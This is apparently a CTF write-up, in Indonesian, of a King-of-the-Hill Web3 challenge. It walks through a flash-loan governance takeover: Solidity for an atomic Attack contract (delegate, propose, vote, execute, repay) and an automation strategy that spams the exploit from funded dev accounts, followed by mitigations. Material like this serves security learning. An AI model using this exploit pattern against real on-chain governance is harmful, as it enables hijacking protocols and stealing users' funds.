# Hostile Takeover — H7CTF Quals (King of the Hill / Web3)

- **Event:** H7CTF Quals
- **Category:** Web3 / Blockchain — **King of the Hill (KotH)**
- **Team:** RUY
- **Solved by:** ftps3rver
- **Target:** `https://web-0a4d5818a2afe8d1.web.h7tex.com` (RPC: `POST /rpc/<koth-token>`)
- **Chain:** local Anvil, `chainId = 31337`

---

## TL;DR

Targetnya adalah sistem governance on-chain (Token ber-voting-power + Governor + kontrak
"Throne") plus sebuah **flash-loan lender** yang meminjamkan token governance itu sendiri.

Governor **tidak punya timelock** dan menghitung voting power secara **live** (`getVotes`
membaca saldo terdelegasi saat itu juga, bukan snapshot masa lalu). Jadi dalam **satu transaksi
atomik** kita bisa:

1. Pinjam sejumlah besar token via flash loan,
2. `delegate` ke diri sendiri → voting power langsung ≥ quorum,
3. `propose` proposal yang memanggil `Throne.setKing(kingKita, tokenKita)`,
4. `castVote` (lolos karena voting power flash-loan),
5. `execute` (tidak ada timelock → langsung jalan),
6. Kembalikan (repay) flash loan.

Karena ini KotH, scorer meng-kredit *holder* = string token yang dipasang di `setKing`. Kita
tinggal **mengulang exploit ini terus-menerus** (dan pulih otomatis saat ronde reset) untuk
menahan takhta dan mencetak poin tiap tick. Bukti hold: log `king=koth_S1Xo... MINE=True`.

---

## 1. Cara main KotH di H7CTF

KotH bukan challenge "sekali dapat flag lalu selesai". Satu target dipakai serentak oleh semua
tim. Kita **merebut** kursi (seat) dan **menahannya**; tiap *tick* kita jadi holder → tim dapat
hold points. Ronde di-reset berkala (target kembali bersih) supaya tidak ada tim yang duduk
santai di lead awal.

Setelah masuk arena kita menerima tiga hal:

- **arena token** (`koth_S1XoUfLhObK0DxmSyQ21HKOlCNV0K3r-`) — identitas publik kita di target,
- **alamat target** + endpoint RPC `POST /rpc/<token>`,
- **request secret** (`kss_...`) — dikirim di header `X-Koth-Secret` untuk mengesahkan request.

Untuk challenge ini, "merebut kursi" = menjadi *King* di kontrak Throne dengan **string token
kita** terpasang sebagai identitas king. `GET /koth/status` (dan getter king-token di kontrak)
membaca string itu; scorer memberi poin ke tim yang string token-nya sedang jadi king.

---

## 2. Rekonaisans — arsitektur target

`GET /koth/info` memberi peta kontrak per ronde:

```json
{
  "chain_id": 31337,
  "contracts": {
    "flashLender": "0x9C2070416f69353ae37EB6634113A9e2a62B755C",
    "governor":    "0x402447Cfef1ed2dB67f2ce6eCc0D0c2076174196",
    "throne":      "0x781A9511aB8a29ebEa5c3F04Eeb0ED33F3c0ce9C",
    "token":       "0x913e43AB8Bc10f646dBA22022CfC37F6706343D1"
  },
  "epoch": "1",
  "rpc": "POST /rpc/<your-koth-token>"
}
```

Empat kontrak yang saling bertaut:

| Kontrak | Peran | Selector kunci (dipakai exploit) |
|---|---|---|
| **Token** | ERC20 governance dengan voting power terdelegasi | `delegate(address)` `0x5c19a95c`, `transfer` `0xa9059cbb` |
| **Governor** | propose / vote / execute proposal | `propose(address,bytes,uint256)` `0x31c2bd0b`, `castVote(uint256)` `0x3eb76b9c`, `execute(uint256)` `0xfe0d94c1` |
| **Throne** | menyimpan siapa King + string token-nya | king-setter `0x21c1f329` (args `address newKing, string token`), king-token getter `0x78121aaf` |
| **FlashLender** | pinjaman kilat token governance | max/available getter `0x242c127c`, `flashLoan(uint256,address,bytes)` `0x2bd94e9c` |

> Catatan selector: beberapa fungsi target pakai nama custom sehingga selector-nya tidak sama
> dengan tanda-tangan "standar" (mis. `setKing(address,string)` standar = `0x9b8d8ab9`, tapi
> target memakai `0x21c1f329`). Semua selector di atas diambil langsung dari on-chain calldata
> yang benar-benar bekerja, bukan tebakan.

Karena chain adalah **Anvil dev node** (`chainId 31337`), akun pra-danai standar Anvil/Hardhat
tersedia untuk semua orang — ini penting untuk fase *hold* (lihat §5).

---

## 3. Analisis kerentanan — flash-loan governance takeover

Pola klasik "Beanstalk-style". Tiga kondisi bergabung jadi bencana:

1. **Voting power live, tanpa snapshot.** Governor/Token menghitung bobot suara dari saldo
   terdelegasi **pada saat vote**, bukan dari snapshot di blok pembuatan proposal. Artinya token
   yang baru kita pegang *detik ini* langsung menghitung sebagai suara.
2. **Tidak ada timelock.** `propose → castVote → execute` bisa terjadi dalam **satu transaksi
   yang sama**. Tidak ada jeda blok/waktu yang biasanya melindungi governance dari serangan
   sesaat.
3. **Flash loan atas token governance itu sendiri.** Lender bersedia meminjamkan token yang
   *adalah* alat voting, tanpa memeriksa apakah peminjam memakainya untuk voting di blok yang
   sama.

Gabungan ketiganya membuat quorum bisa "disewa" sesaat: kita pinjam token, delegasikan ke diri
sendiri, gunakan bobot suaranya untuk meloloskan proposal apa pun, lalu kembalikan token — semua
sebelum transaksi selesai. Proposal yang kita loloskan menyuruh Governor memanggil
`Throne.setKing(kingKita, tokenKita)`, sehingga kursi KotH jadi milik kita.

---

## 4. Exploit — kontrak `Attack` satu-transaksi atomik

Seluruh rantai serangan dibungkus dalam satu kontrak (`Attack.sol`) supaya eksekusinya atomik
(kalau ada langkah gagal, semua di-revert — tidak ada dana nyangkut). Bytecode-nya ditanam
langsung di script (`BIN` di `koth_ruy_fast.py`) sehingga **tidak perlu `solc`** saat run.

`Attack.sol` (inti):

```solidity
function attack(address token,address gov,address throne,address lender,
                uint256 epoch,address newKing,string calldata ktoken) external {
    require(msg.sender==owner,"!o");
    // simpan parameter ronde ...
    // baca jumlah maksimum yang bisa dipinjam
    (bool ok,bytes memory r)=lender.staticcall(abi.encodeWithSelector(0x242c127c));
    require(ok,"mfl"); uint256 amount=abi.decode(r,(uint256));
    // mulai flash loan -> callback onFlashLoan()
    (ok,)=lender.call(abi.encodeWithSelector(0x2bd94e9c,amount,address(this),bytes("")));
    require(ok,"borrow");
}

function onFlashLoan(uint256 amount,bytes calldata) external returns(bytes4){
    require(msg.sender==l,"!l");
    // 1) delegate voting power token yang baru dipinjam ke diri sendiri
    t.call(abi.encodeWithSelector(0x5c19a95c,address(this)));                 // delegate(self)
    // 2) susun calldata target: Throne.setKing(newKing, ourToken)
    bytes memory sk=abi.encodeWithSelector(0x21c1f329,kng,tok);
    // 3) propose(throne, setKing-calldata, epoch) -> dapat proposalId
    (,bytes memory r2)=g.call(abi.encodeWithSelector(0x31c2bd0b,th,sk,ep));
    uint256 id=abi.decode(r2,(uint256));
    // 4) vote (bobot suara = token flash-loan yang sudah didelegasikan)
    g.call(abi.encodeWithSelector(0x3eb76b9c,id));                            // castVote(id)
    // 5) execute -> Governor memanggil Throne.setKing(...) -> kita jadi King
    g.call(abi.encodeWithSelector(0xfe0d94c1,id));                            // execute(id)
    // 6) repay flash loan
    t.call(abi.encodeWithSelector(0xa9059cbb,l,amount));                      // transfer(lender, amount)
    return bytes4(0x0f365f5d);   // ack callback lender
}
```

Urutan di dalam `onFlashLoan` itulah seluruh takeover: **delegate → propose → vote → execute →
repay**, semuanya dalam satu call stack. Begitu `execute` sukses, string token kita sudah
terpasang sebagai King.

---

## 5. Merebut & **menahan** takhta (bagian KotH-nya)

Menang sekali itu mudah; yang mencetak poin adalah **menahan** kursi sementara tim lain terus
merebutnya kembali. Strategi di `koth_ruy_fast.py`:

- **Banyak akun "fresh" paralel.** Kita generate K=8 akun acak (`fresh_keys.json`, dipakai ulang)
  dan mendanainya dari **akun pra-danai standar Anvil** (`FUNDERS` = private key dev Anvil yang
  well-known). Karena tiap akun kita punya nonce sendiri, tx `setKing` tidak berebut nonce dengan
  tim lain dan **mendarat andal** — kita menang balapan hampir tiap tick.
- **Deploy sekali, spam eksekusi.** Tiap akun men-deploy kontrak `Attack` sekali (alamatnya
  dihitung deterministik via `keccak(rlp([sender,nonce]))`), lalu berkali-kali memanggil
  `attack(...)` untuk memasang ulang King kita setiap tick.
- **Sadar-reset.** Thread `refresher` memantau `eth_getCode(throne)`; saat kosong = ronde reset,
  ia menarik `/koth/info` baru, memperbarui alamat kontrak + epoch, menaikkan `gen`, dan semua
  sender otomatis re-deploy `Attack` di ronde baru. Jadi hold bertahan menembus reset ronde tanpa
  intervensi manual.
- **Epoch tracking.** Governor butuh `epoch` yang benar di `propose`; kita baca epoch live
  (`gov` selector `0xa4adcd7f`) dan memasukkannya ke calldata.

Loop status mencetak `king=<token> MINE=<bool>` tiap ~5 detik sehingga kita tahu real-time apakah
kursi sedang kita pegang.

---

## 6. Reproduksi

```bash
cd web3/hostile
pip install web3 eth-account eth-abi requests rlp

# Set kredensial arena kamu sendiri di dalam koth_ruy_fast.py:
#   B = "https://<target>.web.h7tex.com"
#   T = "koth_...."     (arena token = identitas king kamu)
#   S = "kss_...."      (request secret -> header X-Koth-Secret)

python koth_ruy_fast.py            # jalan default ~55 menit
python koth_ruy_fast.py 600        # atau durasi (detik) tertentu
```

Yang terjadi otomatis:

1. `GET /koth/info` → peta kontrak + epoch.
2. Fund 8 akun fresh dari akun dev Anvil.
3. Tiap akun deploy `Attack` (bytecode tertanam, tanpa solc).
4. Spam `attack(...)` → tiap panggilan = flash-loan governance takeover atomik yang memasang King
   = token kita.
5. Pantau `/koth/info` untuk reset ronde; re-deploy & lanjut hold.

Verifikasi manual bahwa kita King:

```bash
# baca king-token getter (selector 0x78121aaf) di kontrak throne, atau:
curl -s https://<target>.web.h7tex.com/koth/status
```

---

## 7. Hasil / bukti

Dari log hold (`hold_*.log`), string token RUY konsisten terpasang sebagai King:

```
[22:01:58] SENT=26  king=koth_S1XoUfLhObK0D MINE=True ep=2 gen=0
[22:03:25] SENT=138 king=koth_S1XoUfLhObK0D MINE=True ep=2 gen=0
[22:07:52] SENT=449 king=koth_S1XoUfLhObK0D MINE=True ep=2 gen=0
```

`MINE=True` = string token kita adalah King saat tick itu → tim RUY mencetak hold points, dan
menempati posisi top-holder di ronde tersebut. Kursi berhasil ditahan melewati banyak tick.

---

## 8. Root cause & mitigasi

Kerentanan intinya: **governance yang bisa dimenangkan dengan modal sesaat**. Perbaikannya
(salah satu / kombinasi):

- **Snapshot voting power** pada blok pembuatan proposal (mis. OpenZeppelin `ERC20Votes` +
  `getPastVotes` / `Governor` dengan `votingDelay > 0`). Token yang dipinjam *setelah* snapshot
  tidak menghitung sebagai suara.
- **Timelock** antara `execute` dan efeknya, sehingga `propose→vote→execute` tak bisa satu blok.
- **Anti-flash-loan**: tolak vote dari alamat yang saldo/delegasinya baru berubah di blok yang
  sama, atau jangan pernah meminjamkan token governance lewat flash loan.

Ketiadaan ketiganya sekaligus itulah yang membuat "sewa quorum satu blok" jadi mungkin.

---

## Lampiran — peta selector

| Selector | Fungsi (perilaku) | Kontrak |
|---|---|---|
| `0x5c19a95c` | `delegate(address)` | Token |
| `0xa9059cbb` | `transfer(address,uint256)` (repay) | Token |
| `0x242c127c` | max/available flash amount getter | FlashLender |
| `0x2bd94e9c` | `flashLoan(uint256,address,bytes)` | FlashLender |
| `0x31c2bd0b` | `propose(address,bytes,uint256)` | Governor |
| `0x3eb76b9c` | `castVote(uint256)` | Governor |
| `0xfe0d94c1` | `execute(uint256)` | Governor |
| `0xa4adcd7f` | epoch getter (dipakai script) | Governor |
| `0x21c1f329` | king-setter `(address newKing, string token)` | Throne |
| `0x78121aaf` | king-token getter (string) | Throne |

**File terkait:** `Attack.sol` (sumber exploit), `koth_ruy_fast.py` (autopwn + hold),
`fresh_keys.json` (akun fresh), `info.json` (peta kontrak), `hold_*.log` (bukti hold).
